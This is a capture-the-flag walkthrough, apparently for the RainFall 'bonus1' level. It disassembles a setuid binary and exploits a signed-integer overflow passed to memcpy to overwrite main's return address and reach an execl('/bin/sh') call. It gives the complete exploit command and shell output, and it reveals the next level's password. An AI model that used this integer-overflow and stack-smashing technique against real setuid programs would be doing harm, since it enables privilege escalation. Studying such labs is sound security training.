#+title: walkthrough
pass: cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
* Data Gathering
** Search for sticky perms
bonus1@RainFall:~$ ls -lhtr
-rwsr-s---+ 1 bonus2 users 5.0K Mar  6  2016 bonus1
** Strings
#+begin_src shell
bonus1@RainFall:~$ readelf -p .rodata bonus1
String dump of section '.rodata':
  [     8]  sh
  [     b]  /bin/sh #*
#+end_src
 * with this string may don't need to create a shellcode.
** Search functions
#+begin_src shell
(gdb) info functions
All defined functions:
Non-debugging symbols:
0x08048320  memcpy@plt -> memcpy may overflow
0x08048350  execl@plt  -> execute a program -> may /bin/sh
0x08048360  atoi@plt   
0x08048424  main       -> only not library function -> * Custom functions
#+end_src
* Binary Analisis
** Disass functions
#+begin_src shell
Dump of assembler code for function main:
   0x08048424 <+0>:	push   ebp
   0x08048425 <+1>:	mov    ebp,esp        -> save the stack frame before locals
   0x08048427 <+3>:	and    esp,0xfffffff0 -> align the stack
   0x0804842a <+6>:	sub    esp,0x40 -> local vars
   0x0804842d <+9>:	mov    eax,DWORD PTR [ebp+0xc] -> take arg
   0x08048430 <+12>:	add    eax,0x4             -> movo to the second arg + 4 B (ptr size)
   0x08048433 <+15>:	mov    eax,DWORD PTR [eax] -> deref the ptr as dword ptr (32 B like a int)
   0x08048435 <+17>:	mov    DWORD PTR [esp],eax -> param to atoi
   0x08048438 <+20>:	call   0x8048360 <atoi@plt>
   0x0804843d <+25>:	mov    DWORD PTR [esp+0x3c],eax -> return of atoi save on stack 
   0x08048441 <+29>:	cmp    DWORD PTR [esp+0x3c],0x9 -> cmp return of atoi with 9 # the first argument should be 9 or less signed cmp.
   0x08048446 <+34>:	jle    0x804844f <main+43> -> if lower equal continue **
   0x08048448 <+36>:	mov    eax,0x1             -> look like error status
   0x0804844d <+41>:	jmp    0x80484a3 <main+127> ->  return
   0x0804844f <+43>:	mov    eax,DWORD PTR [esp+0x3c] -> ** save on eax return atoi
   0x08048453 <+47>:	lea    ecx,[eax*4+0x0]          -> ecx = adress (4*atoi_return) # weird not signed uses here
   0x0804845a <+54>:	mov    eax,DWORD PTR [ebp+0xc] -> argv
   0x0804845d <+57>:	add    eax,0x8                 -> &argv[2]
   0x08048460 <+60>:	mov    eax,DWORD PTR [eax]     -> argv[2]
   0x08048462 <+62>:	mov    edx,eax                 -> edx = argv[2], ecx = 4 * user_input_atoi_signess
   0x08048464 <+64>:	lea    eax,[esp+0x14]          -> use the pointer of the stack
   0x08048468 <+68>:	mov    DWORD PTR [esp+0x8],ecx -> param memcpy size_t n
   0x0804846c <+72>:	mov    DWORD PTR [esp+0x4],edx -> param memcpy src 
   0x08048470 <+76>:	mov    DWORD PTR [esp],eax     -> param memcpy dst
   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
   0x08048478 <+84>:	cmp    DWORD PTR [esp+0x3c],0x574f4c46 -> weird condition ad hoc for ctf i guess
   0x08048480 <+92>:	jne    0x804849e <main+122>
   0x08048482 <+94>:	mov    DWORD PTR [esp+0x8],0x0 -> Null param env execl
   0x0804848a <+102>:	mov    DWORD PTR [esp+0x4],0x8048580 -> param arg 'sh'
   0x08048492 <+110>:	mov    DWORD PTR [esp],0x8048583 ->param pathname '/bin/sh'
   0x08048499 <+117>:	call   0x8048350 <execl@plt>
   0x0804849e <+122>:	mov    eax,0x0
   0x080484a3 <+127>:	leave  
   0x080484a4 <+128>:	ret
#+end_src
** Source
[[source]]
** Get the offset
#+begin_src shell
  b memcpy
  x/a $ebp+4
  0xbffffc3c:	0xb7e454d3 <__libc_start_main+243> # return va main
  p *(char **)$esp
  $1 = 0xbffffc04 "" # buffer
  p/d 0xbffffc3c - 0xbffffc04
  #offset = 56
  # offset / 4 = 56/4 = 14 atoi;
#+end_src
** Get the main va
#+begin_src shell
(gdb) disassemble main
   0x08048482 <+94>:	movl   $0x0,0x8(%esp)
   0x0804848a <+102>:	movl   $0x8048580,0x4(%esp)
   0x08048492 <+110>:	movl   $0x8048583,(%esp)
   0x08048499 <+117>:	call   0x8048350 <execl@plt>
 
# m_va = 0x08048482
#+end_src
** Get the parameter
Use the overflow for write return main to execl va.
#+begin_src shell
    p/u -2147483648 << 2
          $24 = 0
    p/d -2147483648 << 2
          $25 = 0
    p/d (-2147483648 + 14) << 2
          $26 = 56
    p/d (-2147483648 + 14)
          $27 = 2147483662
    p/d (int)(2147483662)
          $30 = -2147483634
    # this is for fill offset but i also need to write the return va
    p/d (int)(-2147483648 + 15)
  $32 = -2147483633
p/d (int)(-2147483648 + 15)
$32 = -2147483633
(gdb) p/d (int)((-2147483648 + 15) << 2)
$33 = 60
#+end_src
**** Verify
#+begin_src shell
 ltrace ./$USER -2147483633 
__libc_start_main(0x8048424, 3, 0xbffffcd4, 0x80484b0, 0x8048520 <unfinished ...>
atoi(0xbffffdff, 0x8049764, 3, 0x80482fd, 0xb7fd13e4)                              = 0x8000000f
memcpy(0xbffffc04, NULL, 60)                      = 0xbffffc04
--- SIGSEGV (Segmentation fault) ---
#+end_src
*** Exploit Strategy
overwrite return main with main execl call.
**** Data Gather
1. ~m_va = 0x08048482~
2. ~offset = 56~
3. ~argv[1] = -2147483633~
4. ~argv[2] = $(python -c 'print "A"*56 + "\x08\x04\x84\x82"[::-1]')~

* Exploit

 # [::-1]a way of make little endian (reverse the string)
 #+begin_src shell
./$USER -2147483633 $(python -c 'print "A"*56 + "\x08\x04\x84\x82"[::-1]')
$ id                             # Succesfull
uid=2011(bonus1) gid=2011(bonus1) euid=2012(bonus2) egid=100(users) groups=2012(bonus2),100(users),2011(bonus1)
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
 #+end_src
